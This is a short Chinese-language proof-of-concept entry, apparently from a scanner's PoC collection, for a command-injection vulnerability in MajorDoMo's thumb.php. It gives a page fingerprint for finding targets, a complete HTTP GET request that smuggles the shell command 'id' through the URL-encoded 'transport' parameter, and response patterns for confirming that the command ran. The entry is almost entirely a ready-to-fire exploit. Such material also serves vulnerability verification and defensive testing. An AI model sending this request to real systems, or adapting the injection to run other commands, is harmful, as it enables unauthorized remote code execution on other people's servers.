﻿# MajorDoMo thumb 命令执行漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="MajordomoSL"

> 验证脚本：HTTP

```
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?uid)(?=.*?gid).*?$

> 上传文件定位：

> 验证文件来源：MajorDoMo thumb 命令执行漏洞.poc

